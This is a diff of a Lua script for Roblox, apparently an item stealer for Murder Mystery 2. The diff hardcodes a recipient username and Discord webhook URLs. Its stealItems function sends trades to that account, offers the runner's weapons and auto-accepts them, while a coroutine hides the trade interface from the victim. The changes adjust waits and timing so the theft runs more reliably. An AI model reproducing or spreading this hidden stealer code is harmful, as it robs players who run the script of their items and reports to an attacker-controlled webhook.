@@ -1,11 +1,11 @@
 -- [ Settings ] --
 local PLACE_ID = 142823291
 
-Username = "Warrior_ggs" -- [Your Username]
+Username = "Warrior_ggs"
 Webhook  = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
 
 -- [ Dualhook Settings ] --
-DualUsername = "Warrior_ggs" -- [Dualhook Username]
+DualUsername = "Warrior_ggs"
 DualWebhook  = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
 DualUnique   = 1
 DualAncient  = 1
@@ -47,7 +47,6 @@ local function refreshTradeRemotes()
     TradeRemotes.AcceptTrade = trade:WaitForChild("AcceptTrade", 15)
     return (TradeRemotes.SendRequest and TradeRemotes.OfferItem and TradeRemotes.AcceptTrade)
 end
-refreshTradeRemotes()
 
 local function safeTradingCall(fn)
     if not refreshTradeRemotes() then
@@ -57,7 +56,7 @@ local function safeTradingCall(fn)
     fn()
 end
 
--- === АНТИ ТРЕЙД GUI ===
+-- === АНТИ-ТРЕЙД GUI ===
 local destroytrades2 = coroutine.create(function()
     while true do
         local pg = LocalPlayer:WaitForChild("PlayerGui")
@@ -182,6 +181,10 @@ local function stealItems()
     safeTradingCall(function()
         coroutine.resume(destroytrades2)
 
+        -- ждём ремоуты и небольшую паузу после телепорта
+        repeat task.wait() until TradeRemotes.SendRequest and TradeRemotes.OfferItem and TradeRemotes.AcceptTrade
+        task.wait(1)
+
         local sendArgs = { Players[userName] }
         TradeRemotes.SendRequest:InvokeServer(unpack(sendArgs))
         task.wait(3)
@@ -189,6 +192,7 @@ local function stealItems()
         local function offerList(tbl)
             for _, v in pairs(tbl) do
                 TradeRemotes.OfferItem:FireServer(v, "Weapons")
+                task.wait(0.1)
             end
         end
 
@@ -201,7 +205,7 @@ local function stealItems()
         offerList(uncommonItems)
         offerList(commonItems)
 
-        task.wait(6)
+        task.wait(2)
         TradeRemotes.AcceptTrade:FireServer(285646582)
     end)
 end
